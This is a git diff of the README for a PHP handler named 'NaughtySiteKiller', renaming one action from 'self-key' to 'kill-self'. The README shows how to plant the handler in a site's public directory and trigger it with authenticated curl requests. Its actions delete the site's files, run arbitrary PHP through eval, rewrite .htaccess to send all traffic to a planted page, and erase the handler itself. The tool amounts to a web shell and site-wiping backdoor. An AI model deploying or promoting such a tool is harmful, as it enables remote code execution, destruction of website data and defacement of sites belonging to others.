@@ -47,7 +47,7 @@ echo hash('sha256', $password);  // Outputs the hashed token
 
 #### 2. Handling the Incoming Request
 
-Place the `NaughtySiteKiller` handler on the public directory of the website where it can be accessed through HTTP requests. This handler will process incoming requests, validate the authorization token, check the requested action (`kill`, `execute`, `template`, `self-key`), and execute the appropriate method.
+Place the `NaughtySiteKiller` handler on the public directory of the website where it can be accessed through HTTP requests. This handler will process incoming requests, validate the authorization token, check the requested action (`kill`, `execute`, `template`, `kill-self`), and execute the appropriate method.
 
 **Example Usage**:
 ```php
@@ -77,7 +77,7 @@ The following fields can be included in the payload when sending a request:
 
 ```php
 $request = [
-    'action'      => 'kill', // Action to perform: 'kill', 'execute', 'template', or 'self-key'.
+    'action'      => 'kill', // Action to perform: 'kill', 'execute', 'template', or 'kill-self'.
     'content'     => 'Content for the template, execute (used in both HTML and PHP files when performing kill action, or for template creation).',
     'htmlContents'=> 'Content for the template.html file (used when performing kill action).', // HTML content for the template.
     'phpContents' => 'Content for the template.php file (used when performing kill action).', // PHP content for the template.
@@ -92,7 +92,7 @@ $request = [
   - `'kill'`: Deletes files including self and creates `index.php` and `index.html` files (HTML and PHP).
   - `'execute'`: Execute a string as PHP code using `eval` function. The instructions should be placed in `contents`.
   - `'template'`: Creates template file `<name>.php` and modifies `.htaccess` to redirect all website request to `<name>.php` if no custom htaccess content is provided.
-  - `'self-key'`: self-destructing, delete the handler file only.
+  - `'kill-self'`: self-destructing, delete the handler file only.
   
 - **`content`** (string): Content to include in the generated template files. Used for both HTML and PHP files during the `kill` action, or for the `template` action.
 
@@ -108,7 +108,7 @@ $request = [
 
 ### Payload Requests Examples
 
-Here are examples of how to send payload requests using `curl` for the different actions (`kill`, `template`, and `self-key`), including the Bearer token in the header.
+Here are examples of how to send payload requests using `curl` for the different actions (`kill`, `template`, and `kill-self`), including the Bearer token in the header.
 
 ### 1. Kill Action Request (Deletes all files and creates template files)
 
@@ -188,12 +188,12 @@ curl -X POST http://your-server-url/naughty.php \
      -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{
-           "action": "self-key"
+           "action": "kill-self"
         }'
 ```
 
 #### Explanation:
-- `action`: Set to `"self-key"`, delete the handler file only.
+- `action`: Set to `"kill-self"`, delete the handler file only.
 
 ---
 
